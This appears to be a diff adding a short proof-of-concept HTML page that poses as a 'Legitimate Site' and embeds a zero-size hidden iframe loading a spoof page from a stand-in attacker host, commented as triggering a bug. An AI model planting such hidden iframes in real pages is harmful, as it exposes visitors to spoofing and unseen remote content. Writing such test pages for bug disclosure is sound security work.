@@ -1,0 +1,12 @@
+  <!DOCTYPE html>
+  <html>
+  <body>
+    <h1>Welcome to Legitimate Site</h1>
+    <p>This content stays visible the whole time.</p>
+
+    <!-- Hidden iframe that triggers the bug -->
+    <iframe src="https://attacker.github.io/spoof.html"
+            style="width:0;height:0;border:none;position:absolute;">
+    </iframe>
+  </body>
+  </html>
